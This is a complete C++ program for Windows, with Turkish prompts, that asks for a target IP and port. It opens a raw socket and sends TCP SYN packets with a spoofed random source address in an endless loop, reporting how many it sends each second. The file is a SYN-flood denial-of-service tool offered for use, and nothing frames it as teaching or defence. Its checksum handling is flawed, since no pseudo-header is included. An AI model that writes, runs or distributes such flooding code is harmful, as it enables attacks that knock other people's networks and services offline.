#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <chrono>
#pragma comment(lib, "ws2_32.lib")

#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)

using namespace std;

struct IPHeader {
    unsigned char  ver_ihl;
    unsigned char  tos;
    unsigned short total_len;
    unsigned short ident;
    unsigned short frag_flags;
    unsigned char  ttl;
    unsigned char  proto;
    unsigned short checksum;
    unsigned int   src_addr;
    unsigned int   dest_addr;
};

struct TCPHeader {
    unsigned short src_port;
    unsigned short dest_port;
    unsigned int   seq_num;
    unsigned int   ack_num;
    unsigned char  data_off;
    unsigned char  flags;
    unsigned short window;
    unsigned short checksum;
    unsigned short urg_ptr;
};

unsigned short checksum(unsigned short *buffer, int length) {
    unsigned long sum = 0;
    while (length > 1) {
        sum += *buffer++;
        length -= 2;
    }
    if (length == 1) sum += *(unsigned char*)buffer;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main() {
    WSADATA wsa;
    SOCKET s;
    char datagram[4096];
    IPHeader *iph = (IPHeader*)datagram;
    TCPHeader *tcph = (TCPHeader*)(datagram + sizeof(IPHeader));
    
    string target_ip;
    int target_port;

    cout << "Hedef IP: ";
    cin >> target_ip;
    cout << "Hedef Port: ";
    cin >> target_port;

    WSAStartup(MAKEWORD(2,2), &wsa);
    s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s == INVALID_SOCKET) {
        cerr << "Raw socket acilamadi! Admin yetkisi gerekli!" << endl;
        return 1;
    }

    sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);

    iph->ver_ihl = 0x45;
    iph->tos = 0;
    iph->total_len = htons(sizeof(IPHeader) + sizeof(TCPHeader));
    iph->ident = htons(rand() % 65535);
    iph->frag_flags = 0;
    iph->ttl = 255;
    iph->proto = IPPROTO_TCP;
    iph->checksum = 0;
    iph->src_addr = rand(); 
    iph->dest_addr = sin.sin_addr.s_addr;

    tcph->src_port = htons(rand() % 65535);
    tcph->dest_port = htons(target_port);
    tcph->seq_num = htonl(rand() % 4294967295);
    tcph->ack_num = 0;
    tcph->data_off = (5 << 4);
    tcph->flags = 0x02;
    tcph->window = htons(65535);
    tcph->checksum = 0;
    tcph->urg_ptr = 0;

    tcph->checksum = checksum((unsigned short*)(datagram + sizeof(IPHeader)), sizeof(TCPHeader));

    int total_sent = 0;
    auto start = chrono::steady_clock::now();
    
    while(true) {
        sendto(s, datagram, sizeof(IPHeader) + sizeof(TCPHeader), 0, (sockaddr*)&sin, sizeof(sin));
        total_sent++;
        
        auto elapsed = chrono::duration_cast<chrono::milliseconds>(chrono::steady_clock::now() - start).count();
        if(elapsed >= 1000) {
            cout << "Gonderilen SYN paketi: " << total_sent << "/s | Hedef: " << target_ip << ":" << target_port << endl;
            total_sent = 0;
            start = chrono::steady_clock::now();
        }
    }

    closesocket(s);
    WSACleanup();
    return 0;
}
